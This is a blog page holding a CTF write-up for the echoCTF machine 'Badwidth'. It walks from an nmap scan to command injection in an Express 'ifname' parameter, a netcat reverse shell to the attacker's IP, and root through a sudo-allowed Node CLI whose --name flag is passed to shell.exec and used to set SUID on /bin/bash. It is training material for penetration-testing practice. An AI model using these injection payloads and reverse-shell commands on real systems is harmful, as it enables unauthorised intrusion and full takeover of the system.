<!doctype html><html lang=en><head><title>echoCTF Badwidth Writeup: Command Injection to Root :: Hacking Blog</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="Step-by-step guide to cracking Badwidth on echoCTF with Command Injection. Perfect for OSCP prep!"><meta name=keywords content="CTF,hacking,cybersecurity,notes,writeups"><meta name=robots content="noodp"><link rel=canonical href=https://hack.com.cy/writeups/echoctf/badwidth/badwidth/><link rel=stylesheet href=https://hack.com.cy/css/buttons.min.86f6b4c106b6c6eb690ae5203d36b442c1f66f718ff4e8164fa86cf6c61ad641.css><link rel=stylesheet href=https://hack.com.cy/css/code.min.d529ea4b2fb8d34328d7d31afc5466d5f7bc2f0bc9abdd98b69385335d7baee4.css><link rel=stylesheet href=https://hack.com.cy/css/fonts.min.5bb7ed13e1d00d8ff39ea84af26737007eb5051b157b86fc24487c94f3dc8bbe.css><link rel=stylesheet href=https://hack.com.cy/css/footer.min.eb8dfc2c6a7eafa36cd3ba92d63e69e849e2200e0002a228d137f236b09ecd75.css><link rel=stylesheet href=https://hack.com.cy/css/gist.min.a751e8b0abe1ba8bc53ced52a38b19d8950fe78ca29454ea8c2595cf26aad5c0.css><link rel=stylesheet href=https://hack.com.cy/css/header.min.75c7eb0e2872d95ff48109c6647d0223a38db52e2561dd87966eb5fc7c6bdac6.css><link rel=stylesheet href=https://hack.com.cy/css/main.min.775ac2af004d44c22a6d000fbd1d9af529642f5cef27399d0280d180af2c2e9b.css><link rel=stylesheet href=https://hack.com.cy/css/menu.min.310d32205bdedd6f43144e3c3273c9deecd238eba5f9108db5ea96ca0cfbe377.css><link rel=stylesheet href=https://hack.com.cy/css/pagination.min.bbb986dbce00a5ce5aca0504b7925fc1c581992a4bf57f163e5d69cc1db7d836.css><link rel=stylesheet href=https://hack.com.cy/css/post.min.ad50c7f4d00e7975918f37fc74c6029e1959a40d66fb5b2c6564a8715e985573.css><link rel=stylesheet href=https://hack.com.cy/css/sidebar.min.d99f1331c4dc2becb305a3d135a35844adbf5c1f39330853456f7e7f5864cb45.css><link rel=stylesheet href=https://hack.com.cy/css/syntax.min.e9ab635cf918bc84b901eb65c0b2caa74c9544245e3647c1af5c129896ef276e.css><link rel=stylesheet href=https://hack.com.cy/css/terminal.min.e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855.css><link rel=stylesheet href=https://hack.com.cy/css/terms.min.b81791663c3790e738e571cdbf802312390d30e4b1d8dc9d814a5b5454d0ac11.css><link rel=stylesheet href=https://hack.com.cy/terminal.css><link rel=stylesheet href=https://hack.com.cy/style.css><link rel="shortcut icon" href=https://hack.com.cy/favicon.png><link rel=apple-touch-icon href=https://hack.com.cy/apple-touch-icon.png><meta name=twitter:card content="summary"><meta name=twitter:site content><meta name=twitter:creator content><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="og:title" content="echoCTF Badwidth Writeup: Command Injection to Root"><meta property="og:description" content="Step-by-step guide to cracking Badwidth on echoCTF with Command Injection. Perfect for OSCP prep!"><meta property="og:url" content="https://hack.com.cy/writeups/echoctf/badwidth/badwidth/"><meta property="og:site_name" content="Hacking Blog"><meta property="og:image" content="https://hack.com.cy/og-image.png"><meta property="og:image:width" content="1200"><meta property="og:image:height" content="627"><meta property="article:section" content="CTF"><meta property="article:section" content="OSCP Prep"><meta property="article:section" content="echoCTF"><meta property="article:published_time" content="2025-06-03 00:00:00 +0000 UTC"><meta name=theme-color content="#0a0e14"><meta name=color-scheme content="dark"><link rel=preload href=/fonts/FiraCode-Latin.woff2 as=font type=font/woff2 crossorigin><meta name=viewport content="width=device-width,initial-scale=1,viewport-fit=cover"><script src=https://cdn.jsdelivr.net/npm/fuse.js@6.6.2/dist/fuse.min.js></script><script defer src=https://hack.com.cy/js/search.js></script></head><body><div class="container center"><header class=header><div class=header__inner><div class=header__logo><a href=/why/><div class=logo>Hacking Vault</div></a></div><ul class="menu menu--mobile"><li class=menu__trigger>Menu&nbsp;▾</li><li><ul class=menu__dropdown><li><a href=/why/>Why</a></li><li><a href=/whoami/>Whoami</a></li><li><a href=/writeups/>Writeups</a></li><li><a href=/notes/>Notes</a></li></ul></li></ul></div><nav class=navigation-menu><ul class="navigation-menu__inner menu--desktop"><li><a href=/why/>Why</a></li><li><a href=/whoami/>Whoami</a></li><li><a href=/writeups/>Writeups</a></li><li><a href=/notes/>Notes</a></li><li><button class=search-button onclick=showSearch() aria-label=Search>Search</button></li></ul></nav></header><div class=content><nav class=breadcrumbs aria-label=Breadcrumb><ol class=breadcrumb-list><li class=breadcrumb-item><a href=https://hack.com.cy/ class=breadcrumb-link><span class=breadcrumb-icon>~</span>Home</a></li><li class=breadcrumb-separator>/</li><li class=breadcrumb-item><a href=https://hack.com.cy/writeups/ class=breadcrumb-link>echoCTF Writeups</a></li><li class=breadcrumb-separator>/</li><li class=breadcrumb-item><a href=https://hack.com.cy/writeups/echoctf/ class=breadcrumb-link>echoCTF Writeups</a></li><li class=breadcrumb-separator>/</li><li class=breadcrumb-item><a href=https://hack.com.cy/writeups/echoctf/badwidth/ class=breadcrumb-link></a></li><li class=breadcrumb-separator>/</li><li class="breadcrumb-item breadcrumb-current" aria-current=page><span class=breadcrumb-text>echoCTF Badwidth Writeup: Command Injection to Root</span></li></ol></nav><style>.breadcrumbs{margin:20px 0 30px;padding:10px 15px;background:var(--background-secondary);border-left:3px solid var(--accent);border-right:1px solid var(--code-border);border-top:1px solid var(--code-border);border-bottom:1px solid var(--code-border)}.breadcrumb-list{display:flex;flex-wrap:wrap;align-items:center;list-style:none;margin:0;padding:0;gap:8px;font-size:.9rem}.breadcrumb-item{display:inline-flex;align-items:center}.breadcrumb-link{color:var(--accent-secondary);text-decoration:none;transition:all .2s ease;display:inline-flex;align-items:center;gap:5px}.breadcrumb-link:hover{color:var(--accent);text-shadow:0 0 5px var(--glow-accent)}.breadcrumb-icon{color:var(--accent);font-weight:700}.breadcrumb-separator{color:var(--code-border);user-select:none}.breadcrumb-current .breadcrumb-text{color:var(--foreground);font-weight:700}@media(max-width:684px){.breadcrumbs{font-size:.85rem;overflow-x:auto}.breadcrumb-list{flex-wrap:nowrap}}</style><article class=post><h1 class=post-title><a href=https://hack.com.cy/writeups/echoctf/badwidth/badwidth/>echoCTF Badwidth Writeup: Command Injection to Root</a></h1><div class=post-meta><time class=post-date>2025-06-03&nbsp;[Updated 2026-01-01]</time><span class=post-reading-time>3 min read (577 words)</span></div><span class=post-tags>#<a href=https://hack.com.cy/tags/command-injection/>Command Injection</a>&nbsp;
#<a href=https://hack.com.cy/tags/linux/>Linux</a>&nbsp;
#<a href=https://hack.com.cy/tags/privilege-escalation/>privilege escalation</a>&nbsp;</span><div class=table-of-contents><h2>Contents</h2><nav id=TableOfContents><ul><li><a href=#video-walkthrough>Video Walkthrough</a></li></ul><ul><li><a href=#nmap-port-scan>NMAP Port Scan</a></li><li><a href=#output>Output</a></li></ul></nav></div><div class=post-content><div><h2 id=video-walkthrough>Video Walkthrough<a href=#video-walkthrough class=hanchor arialabel=Anchor>#</a></h2><div style=position:relative;padding-bottom:56.25%;height:0;overflow:hidden><iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share; fullscreen" loading=eager referrerpolicy=strict-origin-when-cross-origin src="https://www.youtube.com/embed/QZlXwNCp16k?autoplay=0&amp;controls=1&amp;end=0&amp;loop=0&amp;mute=0&amp;start=0" style=position:absolute;top:0;left:0;width:100%;height:100%;border:0 title="YouTube video"></iframe></div><p><a href="https://www.youtube.com/watch?v=QZlXwNCp16k&amp;t=1s"><img src="https://img.shields.io/badge/Watch%20on-YouTube-red?logo=youtube" alt="Watch on YouTube"></a></p><h1 id=badwidth>Badwidth<a href=#badwidth class=hanchor arialabel=Anchor>#</a></h1><h1 id=enumeration>Enumeration<a href=#enumeration class=hanchor arialabel=Anchor>#</a></h1><h2 id=nmap-port-scan>NMAP Port Scan<a href=#nmap-port-scan class=hanchor arialabel=Anchor>#</a></h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo nmap -nvv -p- 10.0.50.0 -T4 -sC -sV
</span></span></code></pre></div><h2 id=output>Output<a href=#output class=hanchor arialabel=Anchor>#</a></h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>PORT     STATE SERVICE REASON         VERSION
</span></span><span class=line><span class=cl>1337/tcp open  http    syn-ack ttl <span class=m>63</span> Node.js Express framework
</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: Site doesn<span class=err>&#39;</span>t have a title <span class=o>(</span>text/plain<span class=p>;</span> <span class=nv>charset</span><span class=o>=</span>utf-8<span class=o>)</span>.
</span></span><span class=line><span class=cl><span class=p>|</span> http-methods: 
</span></span><span class=line><span class=cl><span class=p>|</span>_  Supported Methods: POST GET HEAD
</span></span></code></pre></div><p>Analyzing the NMAP scan we can see there is 1 port open 1337.
It seems that its a webserver using <code>Node.js Express framework</code>.</p><p><img src=/images/Bad1.png alt="Image Description"></p><p>When we try to browse to it we get some informational message or &ldquo;hint&rdquo; that we have to make a POST request including a parameter called &ldquo;ifname&rdquo; and a network interface name</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>└─$ curl -X POST <span class=s1>&#39;http://10.0.50.0:1337/&#39;</span> -d <span class=s1>&#39;ifname=anything&#39;</span>
</span></span><span class=line><span class=cl>Used interface <span class=s2>&#34;anything&#34;</span>
</span></span></code></pre></div><p>When following the format that they want, we get our input reflected back to us.
So we can try breaking this by adding strange symbols, or fuzz it with words in order to get some sort of error back that will give us a clue what it is..</p><p>We can start with a small list first and then move to a bigger one.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>ffuf -u http://10.0.50.0:1337/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt  -X POST -d <span class=s1>&#39;ifname=FUZZ&#39;</span>
</span></span></code></pre></div><p>The output did not help at all as all the output was 200 OK.</p><p>We can start making logical assumptions on how the code is processing our input, it is obvious that is asking for an interface name which is then getting checked with some sort of mechanism and then reflect back to us.</p><p>So if we give it for example <code>ifname=test</code> and the code does <code>echo test</code> we can try to break out of echo and inject our own commands.</p><p>The following is perfect for what I am trying to say and is the one i have used to exploit this.</p><p><a href=https://hackviser.com/tactics/pentesting/web/command-injection>https://hackviser.com/tactics/pentesting/web/command-injection</a></p><h1 id=exploitation>Exploitation<a href=#exploitation class=hanchor arialabel=Anchor>#</a></h1><p>Using the resource above i created a wordlist of payloads related to command injection and i was able to get command execution using the <code>dollar subsitution</code> method.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>└─$ python3 -m http.server <span class=m>80</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>└─$ curl -X POST <span class=s1>&#39;http://10.0.50.0:1337/&#39;</span> -d <span class=s1>&#39;ifname=$(curl%20http://10.10.11.150)&#39;</span> 
</span></span></code></pre></div><p><img src=/images/Bad2.png alt="Image Description"></p><p>In order to get a reverse shell lets use <code>nc</code> and hope that it is installed on the target machine.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo nc -nvlp <span class=m>80</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>curl -X POST <span class=s1>&#39;http://10.0.50.0:1337/&#39;</span> -d <span class=s1>&#39;ifname=$(nc%2010.10.11.150%2080%20-e%20/bin/bash)&#39;</span>
</span></span></code></pre></div><p><img src=/images/Bad3.png alt="Image Description"></p><p>It worked! Notice that spaces are replaced with <code>%20</code></p><h1 id=privilege-escalation>Privilege Escalation<a href=#privilege-escalation class=hanchor arialabel=Anchor>#</a></h1><p>Lets upgrade our shell using python</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>python3 -c <span class=s1>&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>CTRL + Z
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>stty raw -echo<span class=p>;</span><span class=nb>fg</span>
</span></span><span class=line><span class=cl><span class=o>(</span>Press Enter<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>(</span>Press Enter<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>(</span>Press Enter<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>export</span> <span class=nv>TERM</span><span class=o>=</span>xterm
</span></span></code></pre></div><p>It seems that our users can run a binary as root!</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>ETSCTF@badwidth:/app$ sudo -l
</span></span><span class=line><span class=cl>Matching Defaults entries <span class=k>for</span> ETSCTF on badwidth:
</span></span><span class=line><span class=cl>    env_reset, mail_badpass,
</span></span><span class=line><span class=cl>    <span class=nv>secure_path</span><span class=o>=</span>/usr/local/sbin<span class=se>\:</span>/usr/local/bin<span class=se>\:</span>/usr/sbin<span class=se>\:</span>/usr/bin<span class=se>\:</span>/sbin<span class=se>\:</span>/bin
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>User ETSCTF may run the following commands on badwidth:
</span></span><span class=line><span class=cl>    <span class=o>(</span>ALL : ALL<span class=o>)</span> NOPASSWD: /usr/local/bin/n158
</span></span></code></pre></div><p>In order to abuse this we have to understand what the program does.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>ETSCTF@badwidth:/app$ cat /usr/local/bin/n158
</span></span><span class=line><span class=cl><span class=c1>#!/usr/bin/env node</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>require<span class=o>(</span><span class=s1>&#39;../src/cli/index.js&#39;</span><span class=o>)</span><span class=p>;</span>ETSCTF
</span></span></code></pre></div><p>It seems that <code>n158</code> is a link</p><p><img src=/images/Bad4.png alt="Image Description"></p><p>Found the source code, it seems that is importing another module called <code>initiProject</code></p><p><img src=/images/Bad5.png alt="Image Description"></p><p>Looking into it we can see it uses <code>shell.exec</code>, if we can somehow inject our input to be executed from <code>shell.exec</code> we can get root!</p><p><img src=/images/Bad6.png alt="Image Description"></p><p>Trying to understand the code it seems the <code>targetPath</code> variable is controllable by us using the <code>--name</code> flag as shown in the <code>index.js</code> so we can trick the program into running our commands likewise:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo /usr/local/bin/n158 init --name <span class=s1>&#39;;whoami&#39;</span>
</span></span></code></pre></div><p><img src=/images/Bad7.png alt="Image Description"></p><p>And we have command execution as root! So now in order to get an interactive shell we can make the <code>/bin/bash</code> binary a SUID and then run <code>/bin/bash -p</code> to get root</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo /usr/local/bin/n158 init --name <span class=s1>&#39;;chmod u+s /bin/bash&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>CTRL + C
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>/bin/bash -p
</span></span></code></pre></div><p><img src=/images/Bad8.png alt="Image Description"></p><p>ROOT!</p></div></div></article></div><footer class=footer><div class=footer__inner><div class=copyright><span>© 2026 Powered by <a href=https://gohugo.io>Hugo</a></span>
<span>:: <a href=https://github.com/panr/hugo-theme-terminal target=_blank>Theme</a> made by <a href=https://github.com/panr target=_blank>panr</a></span></div></div></footer><script type=text/javascript src=/bundle.min.js></script><div id=search-overlay><div class=search-container><input type=search id=search-input placeholder="Search writeups, notes, and more..." autocomplete=off aria-label=Search><div class=search-hint>Press <kbd>ESC</kbd> to close or <kbd>/</kbd> to open search</div><div id=search-results></div></div><button class=search-close onclick=hideSearch() aria-label="Close search">×</button></div></div></body></html>